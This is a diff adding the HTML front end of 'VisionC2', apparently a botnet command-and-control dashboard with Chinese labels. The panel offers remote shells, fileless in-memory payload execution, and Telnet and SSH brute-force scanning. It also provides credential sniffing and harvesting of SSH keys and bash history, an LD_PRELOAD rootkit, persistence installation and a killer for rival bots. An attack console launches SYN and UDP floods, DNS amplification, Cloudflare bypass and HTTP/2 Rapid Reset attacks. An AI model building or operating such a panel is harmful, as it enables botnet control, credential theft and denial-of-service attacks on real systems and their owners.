@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>VisionC2 — Tactical Command Center</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+</head>
+
+<body>
+    <div class="app-container">
+        <!-- ── Left Tactical Sidebar Navigation ── -->
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <div class="sidebar-brand">&#9790;&#8483;&#9790; VisionC2</div>
+                <span class="sidebar-version">v3.0</span>
+            </div>
+            <nav class="sidebar-nav">
+                <a class="nav-item active" id="nav-bots" onclick="switchSection('bots')">
+                    <span>🖥️</span> 受控端概览 <span class="nav-badge" id="badge-bots">0</span>
+                </a>
+                <a class="nav-item" id="nav-map" onclick="switchSection('map')">
+                    <span>🌐</span> 全球热力图
+                </a>
+                <a class="nav-item" id="nav-tools" onclick="switchSection('tools')">
+                    <span>🛠️</span> 扫描与工具
+                </a>
+                <a class="nav-item" id="nav-socks" onclick="switchSection('socks')">
+                    <span>⚡</span> 代理与隧道 <span class="nav-badge" id="badge-socks">0</span>
+                </a>
+                <a class="nav-item" id="nav-attack" onclick="switchSection('attack')">
+                    <span>🚀</span> 攻击控制台
+                </a>
+                <a class="nav-item" id="nav-terminal" onclick="switchSection('terminal')">
+                    <span>💻</span> PTY 交互终端
+                </a>
+                <a class="nav-item" id="nav-activity" onclick="switchSection('activity')">
+                    <span>📜</span> 活动日志
+                </a>
+                <a class="nav-item" id="nav-settings" onclick="switchSection('settings')">
+                    <span>⚙️</span> 系统设置
+                </a>
+            </nav>
+            <div class="sidebar-footer">
+                <span>系统状态: 正常</span>
+                <a href="/logout" style="color:var(--red);text-decoration:none;font-weight:600">退出</a>
+            </div>
+        </aside>
+
+        <!-- ── Main Content Wrapper ── -->
+        <div class="main-wrapper">
+            <!-- Top Sticky Header Bar -->
+            <header class="top-header">
+                <div class="top-header-left">
+                    <div class="sse-pill">
+                        <span class="sse-dot connected" id="sse-dot"></span>
+                        <span id="sse-text">实时通道: 已建立</span>
+                    </div>
+                    <div class="header-stats-mini">
+                        <div class="mini-stat">在线受控端: <span class="m-val" id="s-bots">0</span></div>
+                        <div class="mini-stat">总内存: <span class="m-val" id="s-ram">0MB</span></div>
+                        <div class="mini-stat">CPU: <span class="m-val" id="s-cpu">0核</span></div>
+                        <div class="mini-stat">运行时间: <span class="m-val" id="s-uptime">0h</span></div>
+                    </div>
+                </div>
+                <div class="top-header-right">
+                    <button class="action-icon-btn" onclick="toggleTheme()" title="切换亮色/暗色主题">🌓</button>
+                    <button class="action-icon-btn" onclick="refreshAll()" title="刷新数据">🔄</button>
+                </div>
+            </header>
+
+            <!-- Main Workspace Sections -->
+            <main class="workspace">
+
+                <!-- ════════ VIEW 1: BOTS & OVERVIEW ════════ -->
+                <section class="view-section active" id="sec-bots">
+                    <!-- Top Stat Cards Grid -->
+                    <div class="stats-grid">
+                        <div class="stat-card-v2">
+                            <div class="sc-head">在线受控端 <span id="s-bots-delta"></span></div>
+                            <div class="sc-val green" id="s-bots-main">0</div>
+                        </div>
+                        <div class="stat-card-v2">
+                            <div class="sc-head">已分配内存</div>
+                            <div class="sc-val" id="s-ram-main">0 MB</div>
+                        </div>
+                        <div class="stat-card-v2">
+                            <div class="sc-head">可用 CPU 核心</div>
+                            <div class="sc-val purple" id="s-cpu-main">0 核</div>
+                        </div>
+                        <div class="stat-card-v2">
+                            <div class="sc-head">会话运行时间</div>
+                            <div class="sc-val" id="s-uptime-main">0h</div>
+                        </div>
+                    </div>
+
+                    <!-- Geo Map & Top Countries Split Grid -->
+                    <div class="map-analytics-grid">
+                        <div class="map-panel-wrap">
+                            <div class="map-header">
+                                <div class="map-title">🌐 全球受控端实时分布图</div>
+                                <div class="map-actions">
+                                    <span class="map-badge" id="map-bot-count">在线节点: 0</span>
+                                </div>
+                            </div>
+                            <div id="map-container" style="height:320px;width:100%;border-radius:10px;overflow:hidden"></div>
+                        </div>
+                        <div class="analytics-card">
+                            <div class="analytics-title">📊 受控端地区分布 (Top Countries)</div>
+                            <div class="top-countries-list" id="top-countries-list">
+                                <div style="color:var(--text-dim);font-size:12px;padding:12px 0">无节点数据...</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Floating Command Center Dock -->
+                    <div class="cmd-dock">
+                        <div class="cmd-dock-header">
+                            <div class="cmd-dock-title">⚡ 快捷命令中心 (Command Center)</div>
+                            <div class="cmd-cat-pills">
+                                <button class="cmd-cat-btn active" data-cat="exec" onclick="switchCmdCat(this)">执行</button>
+                                <button class="cmd-cat-btn" data-cat="network" onclick="switchCmdCat(this)">网络</button>
+                                <button class="cmd-cat-btn" data-cat="mgmt" onclick="switchCmdCat(this)">管理</button>
+                            </div>
+                        </div>
+                        <div class="cmd-dock-body">
+                            <select id="cmd-type" class="cmd-select" onchange="updateArgFields()">
+                                <option value="!shell" data-cat="exec">!shell (系统 Shell)</option>
+                                <option value="!ptyshell" data-cat="exec">!ptyshell (PTY 交互终端)</option>
+                                <option value="!detach" data-cat="exec">!detach (后台运行)</option>
+                                <option value="!memexec" data-cat="exec">!memexec (URL 内存无文件执行)</option>
+                                <option value="!memexecb64" data-cat="exec">!memexecb64 (Base64 内存执行)</option>
+                                <option value="!socks" data-cat="network">!socks (SOCKS5 代理)</option>
+                                <option value="!stopsocks" data-cat="network">!stopsocks (停止代理)</option>
+                                <option value="!portfwd" data-cat="network">!portfwd (TCP 端口转发)</option>
+                                <option value="!stopportfwd" data-cat="network">!stopportfwd (停止端口转发)</option>
+                                <option value="!reinstall" data-cat="mgmt">!reinstall (远程更新/重装)</option>
+                                <option value="!lolnogtfo" data-cat="mgmt">!kill (彻底销毁)</option>
+                            </select>
+                            <div id="arg-fields" style="display:flex;gap:8px;flex:1"></div>
+                            <input type="text" id="cmd-bot" placeholder="目标: 全部受控端 (留空为全广播，或填特定 Bot ID)" class="cmd-input-field">
+                            <button class="cmd-submit-btn" onclick="sendCmd()">发送命令</button>
+                        </div>
+                    </div>
+
+                    <!-- Command Execution & Feedback Log Console -->
+                    <div class="cmd-log-console" style="background:#0d1117;border:1px solid var(--border);border-radius:10px;padding:12px 16px;margin-bottom:20px">
+                        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+                            <div style="font-weight:700;font-size:13px;color:var(--accent);display:flex;align-items:center;gap:6px">
+                                <span>📜</span> 命令下发与响应控制台 (Command Feedback Console)
+                            </div>
+                            <div>
+                                <button class="map-btn" style="padding:2px 8px;font-size:11px" onclick="clearCmdConsole()">清空控制台</button>
+                            </div>
+                        </div>
+                        <div id="cmd-console-body" style="height:120px;overflow-y:auto;background:#050505;color:#888;font-family:var(--mono);font-size:12px;padding:8px;border-radius:6px;white-space:pre-wrap;word-break:break-all">
+[系统就绪] 暂无命令交互，在快捷命令中心或右键菜单触发命令后，执行反馈将在此打印...
+                        </div>
+                    </div>
+
+                    <!-- Bot Management Table Container -->
+                    <div class="table-container">
+                        <div class="table-toolbar">
+                            <input type="text" id="bot-search" placeholder="🔍 搜索 Bot ID、IP、国家、架构..." class="search-input" oninput="filterBotTable()">
+                            <span id="search-count" style="font-size:12px;color:var(--text-dim)"></span>
+                        </div>
+                        <table class="custom-table">
+                            <thead>
+                                <tr>
+                                    <th style="width:40px"><input type="checkbox" onclick="selectAllBots(this)"></th>
+                                    <th>Bot ID</th>
+                                    <th>IP 地址</th>
+                                    <th>国家</th>
+                                    <th>进程 / PID</th>
+                                    <th>系统架构</th>
+                                    <th>内存</th>
+                                    <th>CPU</th>
+                                    <th>能力</th>
+                                    <th>最后心跳</th>
+                                    <th>操作</th>
+                                </tr>
+                            </thead>
+                            <tbody id="bot-tbody">
+                                <tr><td colspan="11" style="text-align:center;padding:24px;color:var(--text-dim)">正在等待受控端连入...</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </section>
+
+                <!-- ════════ VIEW 2: GLOBAL GEO MAP ════════ -->
+                <section class="view-section" id="sec-map">
+                    <div class="map-panel-wrap">
+                        <div class="map-header">
+                            <div class="map-title">🌐 全球受控端热力拓扑大盘</div>
+                        </div>
+                        <div id="full-map-container" style="height:620px;width:100%;border-radius:10px"></div>
+                    </div>
+                </section>
+
+                <!-- ════════ VIEW 3: TOOLS & SCANNERS ════════ -->
+                <section class="view-section" id="sec-tools">
+                    <div class="scanner-grid">
+                        <!-- Card 1: Telnet Brute Force Scanner -->
+                        <div class="scanner-card">
+                            <div class="scanner-card-header">
+                                <span class="scanner-card-title">Telnet 爆破扫描器</span>
+                                <span class="scanner-card-desc">针对指定 CIDR 网段并发爆破 Telnet (23) 凭据并自动上报</span>
+                            </div>
+                            <div class="scanner-card-body">
+                                <input type="text" id="scan-telnet-cidr" placeholder="如 192.168.1.0/24" class="cmd-input-field" style="width:100%;margin-bottom:10px">
+                                <div class="scanner-card-actions">
+                                    <button class="cmd-submit-btn" onclick="startScannerCmd('!telnet_scan', 'scan-telnet-cidr')">全部启动</button>
+                                    <button class="cmd-submit-btn" style="background:var(--red)" onclick="stopScannerCmd()">停止扫描</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Card 2: SSH Brute Force Scanner -->
+                        <div class="scanner-card">
+                            <div class="scanner-card-header">
+                                <span class="scanner-card-title">SSH 爆破扫描器</span>
+                                <span class="scanner-card-desc">针对指定 CIDR 网段并发爆破 SSH (22) 凭据并自动验证</span>
+                            </div>
+                            <div class="scanner-card-body">
+                                <input type="text" id="scan-ssh-cidr" placeholder="如 10.0.0.0/24" class="cmd-input-field" style="width:100%;margin-bottom:10px">
+                                <div class="scanner-card-actions">
+                                    <button class="cmd-submit-btn" onclick="startScannerCmd('!ssh_scan', 'scan-ssh-cidr')">全部启动</button>
+                                    <button class="cmd-submit-btn" style="background:var(--red)" onclick="stopScannerCmd()">停止扫描</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Card 3: Intranet Port Scanner -->
+                        <div class="scanner-card">
+                            <div class="scanner-card-header">
+                                <span class="scanner-card-title">内网端口扫描器</span>
+                                <span class="scanner-card-desc">并发扫描目标主机或网段的开放 TCP 端口及服务</span>
+                            </div>
+                            <div class="scanner-card-body">
+                                <input type="text" id="scan-ps-target" placeholder="目标 IP / CIDR (如 192.168.1.1)" class="cmd-input-field" style="width:100%;margin-bottom:8px">
+                                <input type="text" id="scan-ps-ports" value="22,80,443,3389,8080" class="cmd-input-field" style="width:100%;margin-bottom:10px">
+                                <div class="scanner-card-actions">
+                                    <button class="cmd-submit-btn" onclick="startPortScanCmd()">开始扫描</button>
+                                    <button class="cmd-submit-btn" style="background:var(--red)" onclick="stopPortScanCmd()">停止扫描</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Card 4: Packet Sniffer -->
+                        <div class="scanner-card">
+                            <div class="scanner-card-header">
+                                <span class="scanner-card-title">数据包嗅探器 (Sniffer)</span>
+                                <span class="scanner-card-desc">实时抓取受控端网卡明文传输凭据 (FTP, HTTP Basic 等)</span>
+                            </div>
+                            <div class="scanner-card-body">
+                                <input type="text" id="sniff-iface" placeholder="网卡名称 (如 eth0，留空自动选择)" class="cmd-input-field" style="width:100%;margin-bottom:10px">
+                                <div class="scanner-card-actions">
+                                    <button class="cmd-submit-btn" onclick="startSnifferCmd()">启动嗅探</button>
+                                    <button class="cmd-submit-btn" style="background:var(--blue)" onclick="sendBroadCmd('!sniffer dump')">导出凭据</button>
+                                    <button class="cmd-submit-btn" style="background:var(--red)" onclick="sendBroadCmd('!sniffer stop')">停止嗅探</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Card 5: Rootkit Manager -->
+                        <div class="scanner-card">
+                            <div class="scanner-card-header">
+                                <span class="scanner-card-title">LD_PRELOAD Rootkit 管理</span>
+                                <span class="scanner-card-desc">检测、安装与卸载内核层动态链接库隐蔽与文件隐藏</span>
+                            </div>
+                            <div class="scanner-card-body">
+                                <div class="scanner-card-actions" style="margin-top:10px">
+                                    <button class="cmd-submit-btn" style="background:var(--blue)" onclick="sendBroadCmd('!rootkit status')">检测状态</button>
+                                    <button class="cmd-submit-btn" onclick="sendBroadCmd('!rootkit install')">一键安装隐藏</button>
+                                    <button class="cmd-submit-btn" style="background:var(--red)" onclick="sendBroadCmd('!rootkit remove')">卸载隐藏</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Card 6: Lazarus Competitor Killer -->
+                        <div class="scanner-card">
+                            <div class="scanner-card-header">
+                                <span class="scanner-card-title">竞品杀手与资源抢占 (Lazarus)</span>
+                                <span class="scanner-card-desc">全盘清除其他 Bot 竞品、僵尸进程与被占用的 TCP 端口</span>
+                            </div>
+                            <div class="scanner-card-body">
+                                <div class="scanner-card-actions" style="margin-top:10px">
+                                    <button class="cmd-submit-btn" onclick="sendBroadCmd('!killer scan')">扫除竞品进程</button>
+                                    <button class="cmd-submit-btn" style="background:var(--blue)" onclick="sendBroadCmd('!killer start')">启动杀手守护</button>
+                                    <button class="cmd-submit-btn" style="background:var(--red)" onclick="sendBroadCmd('!killer stop')">停止守护</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Card 7: Persistence Manager -->
+                        <div class="scanner-card">
+                            <div class="scanner-card-header">
+                                <span class="scanner-card-title">深度持久化驻留 (Persistence)</span>
+                                <span class="scanner-card-desc">三重自愈驻留：Systemd、Cron、rc.local 保持开机自启</span>
+                            </div>
+                            <div class="scanner-card-body">
+                                <input type="text" id="persist-url" placeholder="备用 Payload 下载 URL (可选，留空使用自身)" class="cmd-input-field" style="width:100%;margin-bottom:10px">
+                                <div class="scanner-card-actions">
+                                    <button class="cmd-submit-btn" onclick="startPersistCmd()">一键深度持久化</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Card 8: Anti-Debug & Anti-Sandbox -->
+                        <div class="scanner-card">
+                            <div class="scanner-card-header">
+                                <span class="scanner-card-title">反调试与反沙箱环境检测</span>
+                                <span class="scanner-card-desc">检测当前运行环境是否存在调试器、GDB、VMware、QEMU 等</span>
+                            </div>
+                            <div class="scanner-card-body">
+                                <div class="scanner-card-actions" style="margin-top:10px">
+                                    <button class="cmd-submit-btn" style="background:var(--accent-grad)" onclick="sendBroadCmd('!antidbg')">执行全套检测</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Card 9: Credential Harvester -->
+                        <div class="scanner-card">
+                            <div class="scanner-card-header">
+                                <span class="scanner-card-title">内网凭据与 SSH 密钥收割 (Harvest)</span>
+                                <span class="scanner-card-desc">深度扫描提取 SSH 私钥、Known Hosts、Bash 历史命令敏感凭据</span>
+                            </div>
+                            <div class="scanner-card-body">
+                                <div class="scanner-card-actions" style="margin-top:10px">
+                                    <button class="cmd-submit-btn" style="background:var(--accent-grad)" onclick="sendBroadCmd('!harvest')">一键收割凭据</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Scan & Brute Force Results Table -->
+                    <div class="table-container" style="margin-top:24px">
+                        <div class="table-toolbar">
+                            <div style="font-weight:700;display:flex;align-items:center;gap:8px;color:var(--accent)">
+                                <span>📊</span> 扫描战报与爆破凭据汇总 (Scan & Credentials Hub)
+                            </div>
+                            <div style="display:flex;gap:10px">
+                                <button class="map-btn" onclick="loadScanResults()">🔄 刷新战报</button>
+                                <button class="map-btn" style="background:var(--red-dim);color:var(--red)" onclick="clearScanResults()">🗑️ 清空战报</button>
+                            </div>
+                        </div>
+                        <table class="custom-table">
+                            <thead>
+                                <tr>
+                                    <th style="width:100px">时间</th>
+                                    <th style="width:130px">来源 Bot ID</th>
+                                    <th style="width:130px">战报类型</th>
+                                    <th style="width:160px">目标主机 / IP</th>
+                                    <th>命中结果 / 捕获凭据</th>
+                                    <th style="width:100px">操作</th>
+                                </tr>
+                            </thead>
+                            <tbody id="scan-results-tbody">
+                                <tr><td colspan="6" style="text-align:center;padding:24px;color:var(--text-dim)">暂无实时上报的扫描战报或凭据...</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </section>
+
+                <!-- ════════ VIEW 4: PROXIES & TUNNELS ════════ -->
+                <section class="view-section" id="sec-socks">
+                    <div class="table-container">
+                        <div class="table-toolbar">
+                            <span style="font-weight:700">⚡ 活动代理与 TCP 端口转发映射</span>
+                        </div>
+                        <table class="custom-table">
+                            <thead>
+                                <tr>
+                                    <th>类型</th>
+                                    <th>受控端 ID</th>
+                                    <th>监听 / 映射地址</th>
+                                    <th>目标地址</th>
+                                    <th>状态</th>
+                                    <th>操作</th>
+                                </tr>
+                            </thead>
+                            <tbody id="proxy-tbody">
+                                <tr><td colspan="6" style="text-align:center;padding:20px;color:var(--text-dim)">暂无活动的 SOCKS 代理或端口转发隧道</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </section>
+
+                <!-- ════════ VIEW 5: ATTACK HUB ════════ -->
+                <section class="view-section" id="sec-attack">
+                    <div class="cmd-dock" style="margin-bottom:20px">
+                        <div class="cmd-dock-header">
+                            <div class="cmd-dock-title">🚀 L4/L7 泛洪攻击控制中心 (Attack Generator)</div>
+                        </div>
+                        <div class="cmd-dock-body" style="gap:16px">
+                            <div style="flex:1;min-width:180px">
+                                <label style="font-size:12px;color:var(--text-muted);display:block;margin-bottom:4px">攻击协议 / 方法</label>
+                                <select id="atk-method" class="cmd-select" style="width:100%">
+                                    <option value="udpflood">UDP Flood (UDP 报文泛洪)</option>
+                                    <option value="tcpflood">TCP Flood (TCP 连接泛洪)</option>
+                                    <option value="syn">SYN Flood (TCP SYN 报文)</option>
+                                    <option value="ack">ACK Flood (TCP ACK 报文)</option>
+                                    <option value="dns">DNS Amplification (DNS 放大攻击)</option>
+                                    <option value="http">HTTP Flood (HTTP 请求泛洪)</option>
+                                    <option value="https">HTTPS Flood (HTTPS/TLS 泛洪)</option>
+                                    <option value="cfbypass">Cloudflare Bypass (CF 绕过)</option>
+                                    <option value="rapidreset">HTTP/2 Rapid Reset</option>
+                                </select>
+                            </div>
+                            <div style="flex:1;min-width:180px">
+                                <label style="font-size:12px;color:var(--text-muted);display:block;margin-bottom:4px">目标 IP / 域名</label>
+                                <input type="text" id="atk-target" placeholder="例如 1.2.3.4 或 example.com" class="cmd-input-field" style="width:100%">
+                            </div>
+                            <div style="width:110px">
+                                <label style="font-size:12px;color:var(--text-muted);display:block;margin-bottom:4px">目标端口</label>
+                                <input type="number" id="atk-port" value="80" class="cmd-input-field" style="width:100%">
+                            </div>
+                            <div style="width:110px">
+                                <label style="font-size:12px;color:var(--text-muted);display:block;margin-bottom:4px">持续时间 (秒)</label>
+                                <input type="number" id="atk-duration" value="60" class="cmd-input-field" style="width:100%">
+                            </div>
+                            <div style="display:flex;gap:10px">
+                                <button class="cmd-submit-btn" style="background:var(--accent-grad)" onclick="launchAttack()">🚀 发起攻击</button>
+                                <button class="cmd-submit-btn" style="background:var(--red)" onclick="stopAllAttacks()">🔴 停止所有</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="table-container">
+                        <div class="table-toolbar">
+                            <span style="font-weight:700">⚡ 正在进行中的攻击任务 (Active Attacks)</span>
+                            <button class="map-btn" onclick="loadRunningAttacks()">🔄 刷新列表</button>
+                        </div>
+                        <table class="custom-table">
+                            <thead>
+                                <tr>
+                                    <th>协议 / 方法</th>
+                                    <th>目标主机</th>
+                                    <th>端口</th>
+                                    <th>持续总长</th>
+                                    <th>已运行</th>
+                                    <th>剩余时间</th>
+                                    <th>操作</th>
+                                </tr>
+                            </thead>
+                            <tbody id="attacks-tbody">
+                                <tr><td colspan="7" style="text-align:center;padding:20px;color:var(--text-dim)">暂无进行中的攻击任务</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </section>
+
+                <!-- ════════ VIEW 6: PTY TERMINAL ════════ -->
+                <section class="view-section" id="sec-terminal">
+                    <div class="table-container" style="padding:20px;background:#000;color:#0f0;font-family:var(--mono);min-height:450px" id="pty-terminal-wrap">
+                        <div>[VisionC2 PTY Web Console Ready]</div>
+                        <div style="color:#888;margin-top:8px">选择一个受控端点击 "打开 PTY 终端" 开启会话...</div>
+                    </div>
+                </section>
+
+                <!-- ════════ VIEW 7: ACTIVITY LOG ════════ -->
+                <section class="view-section" id="sec-activity">
+                    <div class="table-container">
+                        <table class="custom-table">
+                            <thead>
+                                <tr><th>时间</th><th>类型</th><th>消息内容</th></tr>
+                            </thead>
+                            <tbody id="activity-tbody">
+                                <tr><td colspan="3" style="text-align:center;padding:20px;color:var(--text-dim)">正在等待事件产生...</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </section>
+
+                <!-- ════════ VIEW 8: SETTINGS ════════ -->
+                <section class="view-section" id="sec-settings">
+                    <div class="cmd-dock" style="margin-bottom:20px">
+                        <div class="cmd-dock-header">
+                            <div class="cmd-dock-title">⚙️ 新增操作员账户 (Add Operator Account)</div>
+                        </div>
+                        <div class="cmd-dock-body" style="gap:14px">
+                            <input type="text" id="nu-user" placeholder="用户名" class="cmd-input-field" style="width:160px">
+                            <input type="password" id="nu-pass" placeholder="密码" class="cmd-input-field" style="width:160px">
+                            <select id="nu-level" class="cmd-select" style="width:130px">
+                                <option value="admin">Admin (管理员)</option>
+                                <option value="basic">Basic (普通操作员)</option>
+                                <option value="owner">Owner (最高组)</option>
+                            </select>
+                            <input type="number" id="nu-maxtime" placeholder="最大时长(秒)" value="300" class="cmd-input-field" style="width:120px">
+                            <input type="number" id="nu-concurrents" placeholder="并发数" value="5" class="cmd-input-field" style="width:100px">
+                            <button class="cmd-submit-btn" onclick="createNewUser()">➕ 添加用户</button>
+                        </div>
+                    </div>
+
+                    <div class="table-container">
+                        <div class="table-toolbar">
+                            <span style="font-weight:700">👥 操作员用户列表 (Users & Accounts)</span>
+                            <button class="map-btn" onclick="loadUsers()">🔄 刷新用户</button>
+                        </div>
+                        <table class="custom-table">
+                            <thead>
+                                <tr>
+                                    <th>用户名</th>
+                                    <th>权限等级</th>
+                                    <th>最大单次时长</th>
+                                    <th>最大并发攻击</th>
+                                    <th>最大受控端限制</th>
+                                    <th>API Key</th>
+                                    <th>操作</th>
+                                </tr>
+                            </thead>
+                            <tbody id="users-tbody">
+                                <tr><td colspan="7" style="text-align:center;padding:20px;color:var(--text-dim)">加载中...</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </section>
+
+            </main>
+        </div>
+    </div>
+
+    <!-- Right-click Context Menu -->
+    <div class="ctx-menu" id="bot-ctx-menu" style="display:none;position:fixed;z-index:99999">
+        <div class="ctx-item" onclick="ctxAction('pty')">💻 打开 PTY 终端</div>
+        <div class="ctx-item" onclick="ctxAction('portscan')">🔍 发起内网端口扫描</div>
+        <div class="ctx-item" onclick="ctxAction('portfwd')">⚡ 创建 TCP 端口转发</div>
+        <div class="ctx-item" onclick="ctxAction('rootkit')">🛡️ Rootkit 检查/安装</div>
+        <div class="ctx-item" onclick="ctxAction('persist')">📌 安装深度持久化</div>
+        <div class="ctx-item" onclick="ctxAction('update')">🔄 远程更新受控端</div>
+        <div class="ctx-item danger" onclick="ctxAction('kill')">🔴 彻底销毁受控端</div>
+    </div>
+
+    <!-- Generic Modal Dialog -->
+    <div id="action-modal" class="modal-overlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.75);z-index:9999;align-items:center;justify-content:center">
+        <div class="modal-box" style="background:#161b22;border:1px solid #30363d;border-radius:10px;width:440px;padding:20px;box-shadow:0 10px 30px rgba(0,0,0,0.6)">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;border-bottom:1px solid #30363d;padding-bottom:10px">
+                <div id="modal-title" style="font-weight:700;color:var(--accent);font-size:15px">参数配置</div>
+                <button onclick="closeModal()" style="background:none;border:none;color:#888;font-size:20px;cursor:pointer">&times;</button>
+            </div>
+            <div id="modal-body" style="margin-bottom:20px"></div>
+            <div style="display:flex;justify-content:flex-end;gap:10px">
+                <button class="cmd-cat-btn" onclick="closeModal()">取消</button>
+                <button class="cmd-submit-btn" id="modal-submit-btn">确定发送</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="/static/app.js"></script>
+</body>
+
+</html>
